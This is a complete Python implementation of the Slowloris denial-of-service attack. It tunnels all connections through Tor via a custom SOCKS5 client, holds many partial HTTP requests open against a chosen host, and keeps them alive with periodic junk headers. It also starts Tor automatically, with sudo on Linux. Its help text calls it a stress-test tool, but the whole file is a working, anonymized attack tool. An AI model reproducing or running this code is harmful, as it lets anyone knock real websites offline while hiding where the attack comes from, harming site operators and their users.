#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import struct
import sys
import time
import subprocess
import os
from tqdm import tqdm

# Tor SOCKS5 proxy settings
TOR_PROXY_HOST = "127.0.0.1"
TOR_PROXY_PORT = 9050

# User-agents list
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
]

def check_and_start_tor():
    def is_tor_running():
        try:
            with socket.create_connection((TOR_PROXY_HOST, TOR_PROXY_PORT), timeout=1):
                return True
        except (socket.error, ConnectionRefusedError):
            return False

    if is_tor_running():
        logging.info("Tor is already running.")
        return

    logging.info("Tor is not running. Attempting to start it...")
    try:
        if os.name == 'nt':  # Windows
            subprocess.Popen(["tor.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
        else:  # Linux/macOS
            subprocess.run(["sudo", "service", "tor", "start"], check=True)
        time.sleep(10)  # Give Tor some time to start
        if not is_tor_running():
            raise Exception("Failed to start Tor service.")
        logging.info("Tor started successfully.")
    except (FileNotFoundError, subprocess.CalledProcessError, Exception) as e:
        logging.error(f"Could not start Tor: {e}")
        logging.error("Please make sure Tor is installed and running before using this script.")
        sys.exit(1)

class Socks5Socket:
    def __init__(self, proxy_host, proxy_port):
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(4)

    def connect(self, target_host, target_port):
        self.sock.connect((self.proxy_host, self.proxy_port))
        self.sock.sendall(b"\x05\x01\x00")
        if self.sock.recv(2) != b"\x05\x00":
            raise Exception("SOCKS5 handshake failed")
        
        addr_type = b"\x03"
        ip_bytes = struct.pack("B", len(target_host)) + target_host.encode()
        port_bytes = struct.pack(">H", target_port)
        self.sock.sendall(b"\x05\x01\x00" + addr_type + ip_bytes + port_bytes)
        if self.sock.recv(10)[1] != 0x00:
            raise Exception("SOCKS5 connection failed")

    def send_line(self, line):
        self.sock.sendall(f"{line}\r\n".encode("utf-8"))

    def send_header(self, name, value):
        self.send_line(f"{name}: {value}")

    def close(self):
        self.sock.close()

class Slowloris:
    def __init__(self, host, port, sockets, use_https, rand_user_agent, sleep_time):
        self.host = host
        self.port = port
        self.sockets_count = sockets
        self.use_https = use_https
        self.rand_user_agent = rand_user_agent
        self.sleep_time = sleep_time
        self.sockets = []

        if self.use_https:
            import ssl
            self.ssl_context = ssl.create_default_context()

    def init_socket(self):
        s = Socks5Socket(TOR_PROXY_HOST, TOR_PROXY_PORT)
        s.connect(self.host, self.port)
        
        if self.use_https:
            s.sock = self.ssl_context.wrap_socket(s.sock, server_hostname=self.host)

        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
        ua = random.choice(user_agents) if self.rand_user_agent else user_agents[0]
        s.send_header("User-Agent", ua)
        s.send_header("Accept-language", "en-US,en,q=0.5")
        return s

    def attack(self):
        logging.info(f"Attacking {self.host}:{self.port} with {self.sockets_count} sockets.")
        
        with tqdm(total=self.sockets_count, desc="Creating sockets") as pbar:
            for _ in range(self.sockets_count):
                try:
                    s = self.init_socket()
                    self.sockets.append(s)
                    pbar.update(1)
                except Exception as e:
                    logging.error(f"Failed to create socket: {e}")
        
        try:
            while True:
                logging.info(f"Sending keep-alive headers... Socket count: {len(self.sockets)}")
                
                with tqdm(total=len(self.sockets), desc="Sending headers") as pbar:
                    for s in list(self.sockets):
                        try:
                            s.send_header("X-a", random.randint(1, 5000))
                            pbar.update(1)
                        except socket.error:
                            self.sockets.remove(s)

                diff = self.sockets_count - len(self.sockets)
                if diff > 0:
                    logging.info(f"Recreating {diff} sockets...")
                    with tqdm(total=diff, desc="Recreating sockets") as pbar:
                        for _ in range(diff):
                            try:
                                s = self.init_socket()
                                self.sockets.append(s)
                                pbar.update(1)
                            except Exception as e:
                                logging.error(f"Failed to recreate socket: {e}")
                
                logging.debug(f"Sleeping for {self.sleep_time} seconds")
                time.sleep(self.sleep_time)

        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris attack.")
        finally:
            for s in self.sockets:
                s.close()

def main():
    parser = argparse.ArgumentParser(description="Slowloris, low bandwidth stress test tool for websites")
    parser.add_argument("host", nargs="?", help="Host to perform stress test on")
    parser.add_argument("-p", "--port", default=80, help="Port of webserver, usually 80", type=int)
    parser.add_argument("-s", "--sockets", default=150, help="Number of sockets to use in the test", type=int)
    parser.add_argument("-v", "--verbose", action="store_true", help="Increases logging")
    parser.add_argument("-ua", "--randuseragents", action="store_true", help="Randomizes user-agents with each request")
    parser.add_argument("--https", action="store_true", help="Use HTTPS for the requests")
    parser.add_argument("--sleeptime", default=15, type=int, help="Time to sleep between each header sent.")
    
    args = parser.parse_args()

    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG if args.verbose else logging.INFO,
    )

    check_and_start_tor()

    if not args.host:
        try:
            args.host = input("Please enter the target host/URL: ")
        except KeyboardInterrupt:
            sys.exit(0)

    slowloris = Slowloris(
        args.host,
        args.port,
        args.sockets,
        args.https,
        args.randuseragents,
        args.sleeptime,
    )
    slowloris.attack()

if __name__ == "__main__":
    main()
